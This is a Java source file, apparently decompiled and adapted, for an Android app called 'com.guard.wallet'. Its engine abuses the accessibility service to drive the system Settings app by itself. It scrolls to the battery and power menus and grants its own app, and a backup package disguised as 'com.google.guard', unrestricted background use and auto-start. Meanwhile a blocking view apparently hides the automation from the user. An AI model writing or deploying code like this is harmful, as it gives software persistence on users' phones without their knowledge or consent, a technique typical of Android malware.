package com.guard.wallet.engine;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.delegate.FilterHelper;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * AOSP/Samsung/generic 保活引擎。
 *
 * 处理通用 Android 保活:
 * - 应用详情 -> 电池管理 -> 不受限制用量
 * - 滚动查找设置中的电池/电源项
 *
 * ListenWindows: com.android.settings (多种 Activity 类型)
 *
 * vendor 原始路径: o/g.java
 */
public final class AospKeepAliveEngine extends KeepAliveEngine {

    public static final int v = 0;

    // ADAPT: cache enum values to avoid r.e.X (field 'r' shadows class o.r)
    private static final Object KEEP_ALIVE_UNKNOWN = EngineHelper.KEEP_ALIVE_UNKNOWN;
    private static final Object KEEP_ALIVE_MAIN = EngineHelper.KEEP_ALIVE_MAIN;
    private static final Object KEEP_ALIVE_BACKUP = EngineHelper.KEEP_ALIVE_BACKUP;

    /** KeepAlive state: UNKNOWN -> MAIN_APP -> BACKUP_APP */
    public final AtomicReference r = new AtomicReference<>(KEEP_ALIVE_UNKNOWN);

    /** Full background unrestricted */
    public final AtomicBoolean s = new AtomicBoolean(false);
    /** Auto-start allowed */
    public final AtomicBoolean t = new AtomicBoolean(false);
    /** Associate-start allowed */
    public final AtomicBoolean u = new AtomicBoolean(false);

    public AospKeepAliveEngine() {
        super(k0(), "com.android.settings");
        try {
            this.p.schedule(new com.guard.wallet.delegate.task.PermissionGrantTask(this, 2), 30L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
        }
    }

    // ======= Static CombineFilter builders =======

    /** Filter: TextView text = COMMON_ALLOW_BACKGROUND_USAGE_TEXT (may return null) */
    public static CombineFilter b0() {
        String text = com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_ALLOW_BACKGROUND_USAGE_TEXT");
        if (AppUtils.B(text)) {
            return null;
        }
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addConditionWithEquals(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"),
                "text", text);
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** Filter: TextView text contains COMMON_SETTINGS_BATTERY_TEXT (may return null) */
    public static CombineFilter c0() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_BATTERY_TEXT"))) {
            return null;
        }
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_BATTERY_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** ListenWindow: com.android.settings / SubSettings */
    public static ListenWindow d0() {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** ListenWindow: com.android.settings / InstalledAppDetailsTop (with app name match) */
    public static ListenWindow e0(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings",
                "com.android.settings.applications.InstalledAppDetailsTop");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(EngineHelper.cH(appName));
        return lw;
    }

    /** Filter: TextView text contains COMMON_SETTINGS_POWER_TEXT (may return null) */
    public static CombineFilter f0() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_POWER_TEXT"))) {
            return null;
        }
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_POWER_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** Filter: TextView text contains COMMON_SETTINGS_USE_POWER_TEXT (may return null) */
    public static CombineFilter g0() {
        if (AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_USE_POWER_TEXT"))) {
            return null;
        }
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.addCondition(cf,
                FilterHelper.initFilter(cf, "className", "android.widget.TextView"), "text");
        sc.setContains(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_USE_POWER_TEXT"));
        cf.getStringConditions().add(sc);
        return cf;
    }

    /** ListenWindow: com.android.settings / FrameLayout (with app name match) */
    public static ListenWindow j0(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(EngineHelper.cH(appName));
        return lw;
    }

    /** Build full ListenWindow list for AOSP engine */
    public static LinkedList k0() {
        LinkedList list = new LinkedList();
        list.add(EngineHelper.cJ());
        list.add(e0(com.guard.wallet.utils.SystemHelper.x0()));
        list.add(e0(com.guard.wallet.utils.SystemHelper.e()));
        list.add(m0(com.guard.wallet.utils.SystemHelper.x0()));
        list.add(m0(com.guard.wallet.utils.SystemHelper.e()));
        list.add(j0(com.guard.wallet.utils.SystemHelper.x0()));
        list.add(j0(com.guard.wallet.utils.SystemHelper.e()));
        list.add(d0());
        return list;
    }

    /** ListenWindow: com.android.settings / SpaActivity (with app name match) */
    public static ListenWindow m0(String appName) {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.spa.SpaActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(EngineHelper.cH(appName));
        return lw;
    }

    /**
     * Build CombineFiltersWithOr for unrestricted battery usage options.
     * Matches: UNRESTRICTED_TEXT, NO_RESTRICTED_TEXT, HAS_CANCEL_RESTRICTED_TEXT
     */
    public static CombineFiltersWithOr o0() {
        CombineFiltersWithOr result = new CombineFiltersWithOr();
        result.setFilters(new LinkedList<>());

        /* Filter 1: COMMON_SETTINGS_UNRESTRICTED_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_UNRESTRICTED_TEXT"))) {
            CombineFilter cf1 = new CombineFilter();
            StringCondition sc1 = FilterHelper.addCondition(cf1,
                    FilterHelper.initFilter(cf1, "className", "android.widget.TextView"), "text");
            sc1.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_UNRESTRICTED_TEXT"));
            cf1.getStringConditions().add(sc1);
            result.getFilters().add(cf1);
        }

        /* Filter 2: COMMON_SETTINGS_NO_RESTRICTED_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_NO_RESTRICTED_TEXT"))) {
            CombineFilter cf2 = new CombineFilter();
            StringCondition sc2 = FilterHelper.addCondition(cf2,
                    FilterHelper.initFilter(cf2, "className", "android.widget.TextView"), "text");
            sc2.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_NO_RESTRICTED_TEXT"));
            cf2.getStringConditions().add(sc2);
            result.getFilters().add(cf2);
        }

        /* Filter 3: COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT */
        if (!AppUtils.B(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"))) {
            CombineFilter cf3 = new CombineFilter();
            StringCondition sc3 = FilterHelper.addCondition(cf3,
                    FilterHelper.initFilter(cf3, "className", "android.widget.TextView"), "text");
            sc3.setEquals(com.guard.wallet.utils.LocateValuesUtils.getValue("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"));
            cf3.getStringConditions().add(sc3);
            result.getFilters().add(cf3);
        }

        return result;
    }

    // ======= Window detection helpers =======

    /** Check if in SubSettings (battery management) window */
    public final boolean h0() {
        try {
            if (this.q(Collections.singletonList(d0()))) {
                Log.d("o.g", "已进入App耗电管理窗口");
                return true;
            }
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
        }
        return false;
    }

    /** Check if in app detail window (multiple activity types) */
    public final boolean i0() {
        try {
            String appName = Objects.equals(this.r.get(), KEEP_ALIVE_MAIN)
                    ? com.guard.wallet.utils.SystemHelper.x0() : com.guard.wallet.utils.SystemHelper.e();
            LinkedList list = new LinkedList();
            list.add(e0(appName));
            list.add(m0(appName));
            list.add(j0(appName));
            if (this.q(list)) {
                Log.d("o.g", "已进入App详情窗口");
                return true;
            }
            return false;
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
            return false;
        }
    }

    // ======= Scroll-and-find battery management item =======

    /**
     * l0(scrollView) — scroll through settings to find battery/power management entry.
     * Searches for: c0 (battery), f0 (power), g0 (use_power).
     * Scrolls forward first, then backward, up to 10 times each direction.
     */
    public final UiObject l0(UiObject scrollView) {
        UiObject batteryItem = null;
        UiObject powerItem = null;
        UiObject usePowerItem = null;
        try {
            scrollView.refresh();
            Log.d("o.g", "开始滚动电池电量管理栏目");
            CombineFilter batteryFilter = c0();
            CombineFilter powerFilter = f0();
            CombineFilter usePowerFilter = g0();
            AtomicInteger scrollCount = new AtomicInteger(0);

            /* All null — nothing to search for */
            if (batteryFilter == null && powerFilter == null && usePowerFilter == null) {
                return null;
            }

            /* Initial find attempts */
            if (batteryFilter != null) {
                batteryItem = scrollView.findOneByCombine(batteryFilter);
            }
            if (powerFilter != null) {
                powerItem = scrollView.findOneByCombine(powerFilter);
            }
            if (usePowerFilter != null) {
                usePowerItem = scrollView.findOneByCombine(usePowerFilter);
            }

            /* Scroll forward to find items */
            while (scrollView.canScrollForward()
                    && scrollCount.incrementAndGet() < 10) {
                Log.d("o.g", "滚动视图可以向下滚动");

                /* If any item is visible, stop */
                if (batteryItem != null && batteryItem.visibleToUser()) break;
                if (powerItem != null && powerItem.visibleToUser()) break;
                if (usePowerItem != null && usePowerItem.visibleToUser()) break;

                if (!scrollView.scrollForwardByGesture()) continue;
                Log.d("o.g", "向下滚动查找电池电量管理栏目");
                com.guard.wallet.utils.SystemHelper.T0(10);
                scrollView.refresh();

                if (batteryFilter != null) {
                    batteryItem = scrollView.findOneByCombine(batteryFilter);
                }
                if (powerFilter != null) {
                    powerItem = scrollView.findOneByCombine(powerFilter);
                }
                if (usePowerFilter != null) {
                    usePowerItem = scrollView.findOneByCombine(usePowerFilter);
                }
            }

            scrollCount.set(0);

            /* Scroll backward to find items */
            while (scrollView.canScrollBackward()
                    && scrollCount.incrementAndGet() < 10) {
                Log.d("o.g", "滚动视图可以向上滚动");

                if (batteryItem != null && batteryItem.visibleToUser()) break;
                if (powerItem != null && powerItem.visibleToUser()) break;
                if (usePowerItem != null && usePowerItem.visibleToUser()) break;

                if (!scrollView.scrollBackwardByGesture()) continue;
                Log.d("o.g", "向上滚动查找电池电量管理栏目");
                com.guard.wallet.utils.SystemHelper.T0(10);
                scrollView.refresh();

                if (batteryFilter != null) {
                    batteryItem = scrollView.findOneByCombine(batteryFilter);
                }
                if (powerFilter != null) {
                    powerItem = scrollView.findOneByCombine(powerFilter);
                }
                if (usePowerFilter != null) {
                    usePowerItem = scrollView.findOneByCombine(usePowerFilter);
                }
            }
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
        }

        /* Return first non-null result, prioritizing usePower > power > battery */
        if (usePowerItem != null) return usePowerItem;
        if (powerItem != null) return powerItem;
        return batteryItem;
    }

    // ======= Strategy save =======

    /** Save keep-alive strategy for given package */
    public final void n0(String pkg) {
        try {
            PowerControlStateVO state = com.guard.wallet.utils.SharedPrefsManager.k(pkg);
            state.setPackageName(pkg);
            if (this.s.get()) {
                state.setAllowAllFullBackground(this.s.get());
            }
            if (this.t.get()) {
                state.setAllowAutoStart(this.t.get());
            }
            if (this.u.get()) {
                state.setAllowRelateStart(this.u.get());
            }
            state.setRetryCount(state.getRetryCount() + 1);
            com.guard.wallet.utils.SharedPrefsManager.L(state);
            Log.d("o.g", "已保存本地保活策略".concat("|").concat(pkg));
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
        }
    }

    // ======= Engine lifecycle =======

    @Override
    public final void Z() {
        ReentrantLock lock = this.o;
        if (lock.tryLock()) {
            try {
                if (!isEngineFinished()) {
                    Log.d("o.g", "准备结束本地保活自动化引擎");
                    markEngineRunning();
                    com.guard.wallet.helper.BlockViewManager.h(100);
                    if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().x();
                    }
                    AtomicReference stateRef = this.r;
                    if (Objects.equals(stateRef.get(), KEEP_ALIVE_MAIN)) {
                        n0(MainApplication.getAppContext().getPackageName());
                    }
                    if (Objects.equals(stateRef.get(), KEEP_ALIVE_BACKUP)) {
                        n0("com.google.guard");
                    }
                    this.p.shutdownNow();
                    com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
                    this.n.clear();
                    if (AppUtils.M()) {
                        com.guard.wallet.utils.SystemHelper.T0(5);
                    }
                    com.guard.wallet.helper.BlockViewManager.c();
                    Log.d("o.g", "已结束本地保活自动化引擎");
                    EngineHelper.cW();
                    this.d();
                }
            } catch (Exception e2) {
                AppUtils.s("o.g", e2);
            }
            lock.unlock();
        }
    }

    @Override
    public final void u(AccessibilityEvent event, String packageName, String className) {
        try {
            if (isEngineFinished()) {
                return;
            }
            if (event != null) {
                super.u(event, packageName, className);
            }
            boolean inAppDetail = i0();
            String delegateId = this.c;
            ConcurrentLinkedQueue queue = this.n;

            if (inAppDetail) {
                queue.remove("keepAliveInAppBattery");
                if (!queue.contains("keepAliveInAppDetail")) {
                    queue.add("keepAliveInAppDetail");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PermissionGrantTask(this, 0), delegateId);
                }
            }
            // ADAPT: HyperOS 3 降级后 i0()/h0() 同属 com.android.settings 可能同时 true
            else if (h0()) {
                queue.remove("keepAliveInAppDetail");
                if (!queue.contains("keepAliveInAppBattery")) {
                    queue.add("keepAliveInAppBattery");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PermissionGrantTask(this, 1), delegateId);
                }
            }
        } catch (Exception e2) {
            AppUtils.s("o.g", e2);
        }
    }
}
